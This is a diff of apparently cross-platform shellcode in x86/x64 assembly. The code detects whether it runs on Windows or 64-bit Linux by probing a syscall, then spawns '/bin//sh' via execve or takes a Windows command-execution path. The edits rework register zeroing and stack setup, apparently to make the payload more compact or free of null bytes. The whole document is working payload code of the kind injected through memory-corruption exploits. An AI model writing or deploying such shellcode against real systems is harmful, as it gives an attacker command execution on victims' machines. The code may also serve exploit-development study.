@@ -5,19 +5,23 @@
 
     bits    32
     
-    ;int3
-    
     push    esi
     push    edi
     push    ebx
     push    ebp
-    sub     esp, 28h         ; setup homespace for win64
-    jmp     l_sb             ; load command
+    
+    xor     ecx, ecx          ; ecx=0
+    mul     ecx               ; eax=0, edx=0
+    
+    push    eax
+    push    eax
+    push    eax
+    push    eax
+    push    eax               ; setup homespace for win64
+    jmp     l_sb              ; load command
     
 get_os:
     pop     edi               ; edi=cmd, argv
-    xor     ecx, ecx          ; ecx=0
-    mul     ecx               ; eax=0, edx=0
     mov     cl, 7
     ; initialize cmd/argv regardless of OS
     push    eax               ; argv[3]=NULL;
@@ -55,14 +59,15 @@ get_os:
     ; we're 64-bit, execute syscall and see what
     ; error returned
 gos_x64:
-    xor     edi, edi
+    push    -1
+    pop     edi
     syscall
     cmp     al, 5             ; Access Violation indicates windows
-    xchg    eax, edi          ; eax=0
+    push    59
+    pop     eax
+    cdq
     jz      win_cmd
     
-    ; we're 64-bit Linux
-    mov     al, 59           ; rax=sys_execve
     pop     edi              ; rdi="/bin//sh", 0
     pop     esi              ; rsi=argv
     syscall
@@ -124,7 +129,11 @@ fwe:
     call    rdi
 cmd_end:
     bits    32
-    add     esp, 28h
+    pop     eax
+    pop     eax
+    pop     eax
+    pop     eax
+    pop     eax
     pop     ebp
     pop     ebx
     pop     edi
